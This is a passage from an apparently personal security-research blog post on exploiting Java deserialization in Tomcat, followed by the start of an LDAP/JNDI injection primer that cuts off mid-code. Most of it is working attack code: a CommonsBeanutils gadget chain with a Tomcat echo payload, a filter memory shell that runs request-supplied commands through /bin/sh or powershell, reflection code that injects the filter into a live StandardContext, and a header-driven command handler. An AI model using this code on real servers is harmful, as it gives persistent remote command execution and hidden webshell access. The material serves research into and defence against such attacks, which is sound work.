java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(<span class="hljs-literal">null</span>, TomcatEcho.getBytes());  <br><span class="hljs-comment">// mock method name until armed  </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);  <br>  <br><span class="hljs-comment">// create queue with numbers and basic comparator  </span><br><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);  <br><span class="hljs-comment">// stub data for replacement later  </span><br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>  <br><span class="hljs-comment">// switch method called by comparator  </span><br>Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br>  <br><span class="hljs-comment">// switch contents of queue  </span><br><span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);  <br>queueArray[<span class="hljs-number">0</span>] = templates;  <br>queueArray[<span class="hljs-number">1</span>] = templates;  <br>  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure><p>Run the vulnerable servlet in the previous section, add a <code>cmd</code> header, and we can get the result in response:<br>![[Pasted image 20231025153102.png]]</p><p>There is a more general echo method in the <code>TomcatEchoTemplate</code> class of ysoserial, which performs simultaneously.</p><h3 id="Inject-memshell-via-deserialization-vul"><a href="#Inject-memshell-via-deserialization-vul" class="headerlink" title="Inject memshell via deserialization vul"></a>Inject memshell via deserialization vul</h3><p>We have studied the approach to obtaining echo of deserialization vulnerability. In this section, I will present how to inject a filter memory shell by deserialization vulnerability to Tomcat server and I will use the same servlet environment as previous section.<br>To inject a filter memory shell, it necessary to access a <code>StandardContext</code> object at first. We can find it by using <code>java-object-searcher</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;ServletContext&quot;</span>).build());  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;ServletRequest&quot;</span>).build());  <br><span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(), keys);  <br>searcher.setIs_debug(<span class="hljs-literal">false</span>);  <br>searcher.setMax_search_depth(<span class="hljs-number">20</span>);  <br>searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\Files\\Java_WorkSpace\\Webapp-for-tomcat9\\webapp-for-tomcat9&quot;</span>);  <br>searcher.searchObject();<br></code></pre></td></tr></table></figure><p>I find only one chain:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">TargetObject = &#123;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.threads</span>.TaskThread&#125;   <br>  ---&gt; contextClassLoader = &#123;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.loader</span>.ParallelWebappClassLoader&#125;   <br>    ---&gt; resources = &#123;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.webresources</span>.StandardRoot&#125;   <br>     ---&gt; context = &#123;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span>.StandardContext&#125;   <br>   ---&gt; noPluggabilityServletContext = &#123;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span>.StandardContext<span class="hljs-variable">$NoPluggabilityServletContext</span>&#125;<br></code></pre></td></tr></table></figure><p>Create a new evil class named <code>TomcatMemshellPayload</code> in the fundamental of <code>TomcatEchoPayload</code>. Reproduce the chain as following:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StandardContext <span class="hljs-title function_">getStandardContext</span><span class="hljs-params">(Thread thread)</span> &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> getFieldValue(thread, <span class="hljs-string">&quot;contextClassLoader&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> getFieldValue(o, <span class="hljs-string">&quot;resources&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> getFieldValue(o1, <span class="hljs-string">&quot;context&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (classNameContains(o2, <span class="hljs-string">&quot;StandardContext&quot;</span>)) &#123;  <br>            <span class="hljs-keyword">return</span> (StandardContext) o2;  <br>  <br>        &#125;  <br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Define the filter class to inject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> filter;  <br>  <br><span class="hljs-keyword">import</span> javax.servlet.*;  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStreamReader;  <br><span class="hljs-keyword">import</span> java.nio.charset.Charset;  <br><span class="hljs-keyword">import</span> java.util.Scanner;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemshellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">defaultCharSet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;utf-8&quot;</span>;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmdTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;%s&quot;</span>;<span class="hljs-comment">//chcp 65001&amp;  </span><br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;  <br>        <span class="hljs-keyword">if</span> (servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">charSet</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;charset&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (charSet != <span class="hljs-literal">null</span>) &#123;  <br>                    charSet = charSet.trim();  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    charSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();  <br>                &#125;  <br>                String[] cmds = <span class="hljs-literal">null</span>;  <br>                <span class="hljs-keyword">if</span> (File.separator.equals(<span class="hljs-string">&quot;/&quot;</span>)) &#123;  <br>                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, String.format(cmdTemplate, servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))&#125;;  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;powershell&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, String.format(cmdTemplate, servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))&#125;;  <br>                &#125;  <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();  <br>                <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, charSet.isEmpty() ? Charset.forName(defaultCharSet) : Charset.forName(charSet));  <br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(reader).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);  <br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>                <span class="hljs-keyword">while</span> (scanner.hasNextLine()) &#123;  <br>                    stringBuilder.append(scanner.nextLine());  <br>                &#125;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> stringBuilder.toString();  <br>                servletResponse.getWriter().println(result);  <br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>                servletResponse.getWriter().println(<span class="hljs-string">&quot;Exception:&quot;</span> + e.getClass().getName() + e.getMessage());  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            filterChain.doFilter(servletRequest, servletResponse);  <br>        &#125;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Inject the evil filter. Note that, we should compile the byte code of the <code>MemshellFilter</code> class and encode by base64. And define the class dynamically to the current class loader.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">injectMemshell</span><span class="hljs-params">(StandardContext standardContext, String filterName)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>HashMap&lt;String, ApplicationFilterConfig&gt; map = (HashMap&lt;String, ApplicationFilterConfig&gt;) getFieldValue(standardContext, <span class="hljs-string">&quot;filterConfigs&quot;</span>);<br><span class="hljs-keyword">if</span> (map == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (map.get(filterName) == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//tomcat9</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">filterDefClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>filterDefClass = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>filterDefClass = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>);<br>&#125;<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>clazz = Class.forName(<span class="hljs-string">&quot;filter.MemshellFilter&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAzgoAEQBnCABoCQAuAGkIAGoJAC4AawgAbAsAbQB...&quot;</span>;<br><span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(s);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> classLoader.getClass().getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>method.setAccessible(<span class="hljs-literal">true</span>);<br>clazz = (Class) method.invoke(classLoader, bytes, <span class="hljs-number">0</span>, bytes.length);<br>&#125;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> clazz.newInstance();<br><span class="hljs-type">Object</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> filterDefClass.newInstance();<br>filterDef.getClass().getDeclaredMethod(<span class="hljs-string">&quot;setFilterName&quot;</span>, String.class).invoke(filterDef, filterName);<br>filterDef.getClass().getDeclaredMethod(<span class="hljs-string">&quot;setFilter&quot;</span>, Filter.class).invoke(filterDef, filter);<br>filterDef.getClass().getDeclaredMethod(<span class="hljs-string">&quot;setFilterClass&quot;</span>, String.class).invoke(filterDef, filter.getClass().getName());<br>standardContext.addFilterDef((FilterDef) filterDef);<br><br><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/memshell&quot;</span>);<br>filterMap.setFilterName(filterName);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>standardContext.addFilterMapBefore(filterMap);<br><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br>map.put(filterName, filterConfig);<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Enrich our request handler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(org.apache.coyote.Request request, Thread thread)</span> &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        org.apache.coyote.<span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> request.getResponse();  <br>        java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.length() &lt;= <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125;  <br>        <span class="hljs-keyword">if</span> (cmd.equals(<span class="hljs-string">&quot;inject&quot;</span>)) &#123;  <br>            <span class="hljs-keyword">if</span> (standardContext == <span class="hljs-literal">null</span>) &#123;  <br>                cmd = <span class="hljs-string">&quot;wrong&quot;</span>;  <br>            &#125;  <br>            injectMemshell(standardContext, <span class="hljs-string">&quot;TomcatMemshellFilter&quot;</span>);  <br>            cmd = <span class="hljs-string">&quot;success&quot;</span>;  <br>        &#125;  <br>        <span class="hljs-type">byte</span>[] res = <span class="hljs-literal">null</span>;  <br>        <span class="hljs-keyword">if</span> (cmd.equals(<span class="hljs-string">&quot;wrong&quot;</span>)) &#123;  <br>            res = <span class="hljs-string">&quot;StandardContext not found. &quot;</span>.getBytes();  <br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.equals(<span class="hljs-string">&quot;success&quot;</span>)) &#123;  <br>            res = <span class="hljs-string">&quot;Request /memshell?cmd=whoami &quot;</span>.getBytes();  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            res = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>((<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;powershell.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, cmd&#125;)).start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();  <br>        &#125;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">byteChunkCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">byteChunk</span> <span class="hljs-operator">=</span> byteChunkCls.newInstance();  <br>        byteChunk.getClass().getDeclaredMethod(<span class="hljs-string">&quot;setBytes&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class).invoke(byteChunk, res, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">0</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(res.length));  <br>        response.setStatus(<span class="hljs-number">200</span>);  <br>        response.addHeader(<span class="hljs-string">&quot;TomcatEcho&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, StandardCharsets.UTF_8));  <br>        response.getClass().getDeclaredMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, byteChunkCls).invoke(response, byteChunk);  <br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Request the vulnerable servlet with the header <code>cmd: inject</code>, if inject successfully, we will get the response “Request &#x2F;memshell?cmd&#x3D;whoami”. We can check the result by requesting <code>/introspection.jsp</code>. </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less">Filters:  <br>Index:0  <br><span class="hljs-attribute">Filter name</span>:TomcatMemshellFilter  <br>Filter <span class="hljs-attribute">class</span>:filter.MemshellFilter  <br>Servlet name <span class="hljs-attribute">mappings</span>:  <br>Init <span class="hljs-attribute">params</span>:  <br>Url pattern <span class="hljs-attribute">mappings</span>:/memshell, <br><br><span class="hljs-attribute">Index</span>:<span class="hljs-number">1</span>  <br>Filter <span class="hljs-attribute">name</span>:Tomcat WebSocket (JSR356) Filter  <br>Filter <span class="hljs-attribute">class</span>:org.apache.tomcat.websocket.server.WsFilter  <br>Servlet name <span class="hljs-attribute">mappings</span>:  <br>Init <span class="hljs-attribute">params</span>:  <br>Url pattern <span class="hljs-attribute">mappings</span>:<span class="hljs-comment">/*,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Index:2  </span><br><span class="hljs-comment">Filter name:filter.IndexFilter  </span><br><span class="hljs-comment">Filter class:filter.IndexFilter  </span><br><span class="hljs-comment">Servlet name mappings:  </span><br><span class="hljs-comment">Init params:  </span><br><span class="hljs-comment">Url pattern mappings:/index,</span><br></code></pre></td></tr></table></figure><hr><h1 id="JNDI-Injection-Basic"><a href="#JNDI-Injection-Basic" class="headerlink" title="JNDI Injection Basic"></a>JNDI Injection Basic</h1><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h4><p><em><strong>Entry</strong></em> is a collection of information about an entity. Each <em>entry</em> consists of three primary components: a DN, a collection of attributes and a collection of object classes.</p><p><strong>DN</strong>(Distinguished name) is comprised of RDNs(Relative DN). <strong>RDN</strong> is comprised of <em><strong>Attributes</strong></em>. In RDN, attributes are separated by plus sign. In DN, RDNs are separated by comma. The order of RDNs specifies the position of the associated entry in the <strong>DIT</strong>(Directory information tree). The list of RDN grows to the left.<br>Example:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">RDN1: <span class="hljs-attribute">uid</span>=john.doe<br>RDN2: <span class="hljs-attribute">givenName</span>=John+sn=Doe<br>DN1: <span class="hljs-attribute">uid</span>=john.doe,ou=People,dc=example,dc=com<br>DN2: <span class="hljs-attribute">ou</span>=People,dc=example,dc=com<br>(DN2 is the parent of DN1.)<br><br></code></pre></td></tr></table></figure><p><em><strong>Schema</strong></em> is the configuration of LDAP server. LDAP bind requests should follow the conduct specified by the schema. When creating an <code>InMemoryDirectoryServer</code>, the schema should be loaded explicitly otherwise any <code>bind()</code> action would fail. Or we can set server’s schema to null.</p><p>LDAP only supports storing objects in any type of <code>Serializable</code>, <code>Referencable</code> or <code>DirContext</code>. </p><h4 id="Start-a-LDAP-server"><a href="#Start-a-LDAP-server" class="headerlink" title="Start a LDAP server"></a>Start a LDAP server</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">2389</span>;  <br><span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">serverConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(<span class="hljs-string">&quot;dc=example,dc=com&quot;</span>);  <br>serverConfig.setSchema(<span class="hljs-literal">null</span>);  <br>serverConfig.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(  <br>        <span class="hljs-string">&quot;listen&quot;</span>,  <br>        InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),  <br>        port,  <br>        ServerSocketFactory.getDefault(),  <br>        SocketFactory.getDefault(),  <br>        (SSLSocketFactory) SSLSocketFactory.getDefault()));  <br>  <br><span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(serverConfig);  <br>ds.startListening();<br></code></pre></td></tr></table></figure><h4 id="Store-and-request-Serializable-objects"><a href="#Store-and-request-Serializable-objects" class="headerlink" title="Store and request Serializable objects"></a>Store and request Serializable objects</h4><blockquote><p>[!NOTE] restrictions<br>The class of object in LDAP serializable entry must exist in client’s class path.<br>Exploitation by serializable entry only take effect along with client’s serialization vulnerability.</p></blockquote><p>How to bind a serializable object into LDAP server is shown as below. Actually, only <code>javaClassName</code> attribute is mandatory.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 